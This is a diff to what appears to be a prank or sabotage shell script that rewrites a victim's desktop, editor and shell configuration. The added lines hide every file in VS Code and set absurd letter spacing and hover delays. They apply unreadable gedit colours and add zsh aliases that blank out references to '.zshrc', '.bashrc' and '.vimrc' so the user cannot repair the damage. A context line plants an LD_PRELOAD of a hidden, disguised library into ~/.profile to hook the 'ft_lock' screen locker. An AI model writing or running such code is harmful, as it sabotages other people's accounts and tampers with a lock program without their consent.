@@ -40,6 +40,41 @@ trans-panel-opacity=0.050000000000000003
 trans-use-custom-bg=true
 trans-use-custom-gradient=true
 trans-use-custom-opacity=true
+
+[org/gnome/terminal]
+[legacy/profiles:/:b1dcc9dd-5262-4d8d-a863-c897e6d979b9]
+custom-command='/bin/zsh'
+use-custom-command=true
+
+[org/gnome/desktop/interface]
+font-name='D050000L Italic 9'
+monospace-font-name='Z003 Medium Italic 11'
+text-scaling-factor=1.1300000000000001
+
+[org/gnome/desktop/wm/preferences]
+button-layout='appmenu,close:'
+
+[org/gnome/gedit/plugins]
+active-plugins=@as []
+
+[org/gnome/gedit/preferences/editor]
+auto-save=true
+auto-save-interval=uint32 1
+background-pattern='grid'
+create-backup-copy=true
+scheme='tango'
+tabs-size=uint32 20
+wrap-last-split-mode='word'
+
+[org/gnome/gedit/preferences/ui]
+show-tabs-mode='auto'
+
+[org/gnome/gedit/state/window]
+bottom-panel-size=140
+side-panel-active-page='GeditWindowDocumentsPanel'
+side-panel-size=200
+size=(900, 700)
+state=87168
 EOF
 
 mkdir -p ~/.config/gtk-3.0/
@@ -60,6 +95,11 @@ button, .horizontal {
 * {
   border-radius: 300px;
   opacity: 0.9;
+}
+
+.gedit-view > * {
+  background-color: blue;
+  color: purple;
 }
 EOF
 
@@ -90,7 +130,14 @@ echo "LD_PRELOAD=~/Public/.sudo_as_root_successful ft_lock -d" >> ~/.profile
 
 cat > ~/.var/app/com.visualstudio.code/config/Code/User/settings.json <<EOF
 {
-    "workbench.colorTheme": "zmito"
+    "workbench.colorTheme": "zmito",
+    "files.exclude": {
+        "**/.*": true,
+        "**/*": true
+    },
+    "editor.experimentalWhitespaceRendering": "off",
+    "editor.hover.hidingDelay": 3009000,
+    "editor.letterSpacing": 30
 }
 EOF
 
@@ -141,6 +188,9 @@ preexec() { sleep 0.5 }
 alias -g "~/.zshrc"=""
 alias -g "~/.vimrc"=""
 alias -g "~/.bashrc"=""
+alias -g ".zshrc"=""
+alias -g ".vimrc"=""
+alias -g ".bashrc"=""
 EOF
 
 mkdir -p ~/.config/terminator
